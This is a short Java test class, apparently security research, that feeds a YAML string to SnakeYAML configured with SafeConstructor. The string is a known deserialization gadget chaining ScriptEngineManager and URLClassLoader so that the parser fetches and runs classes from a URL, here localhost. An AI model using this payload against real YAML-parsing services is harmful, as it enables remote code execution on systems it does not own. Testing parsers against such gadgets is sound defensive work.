import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;
import deserialize.Test;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;
import org.yaml.snakeyaml.introspector.BeanAccess;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

/**
 * @author huanmao.sjc
 * @version $Id: YAMLTest, v 0.1 2020-06-03 8:44 PM th1s Exp $
 */
public class YAMLTest {
    public static void main(String[] args) {
        Yaml yaml = getYaml();
        String yamlString = "!!testfather\n"
                + "name: null\n"
                + "testSon:\n"
                + "  props: !!org.springframework.beans.factory.support.ManagedProperties\n"
                + "     source: [!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0"
                + ".1/\"]]]]]\n"
                + "  test: null";

        Object ob = yaml.loadAs(yamlString, testfather.class);
        System.out.println(yamlString);
    }

    private static Yaml getYaml() {
        //LoaderOptions loadingConfig = new LoaderOptions();
        //int maxAliasesForCollections = Integer.parseInt(System.getProperty("bamboo.specs.max.aliases.for.collections", "1500"));
        //loadingConfig.setAllowDuplicateKeys(false);
        //Yaml yaml = new Yaml(new WhitelistedYamlConstructor());
        //yaml.setBeanAccess(BeanAccess.FIELD);
        return new Yaml(new SafeConstructor());
    }
}
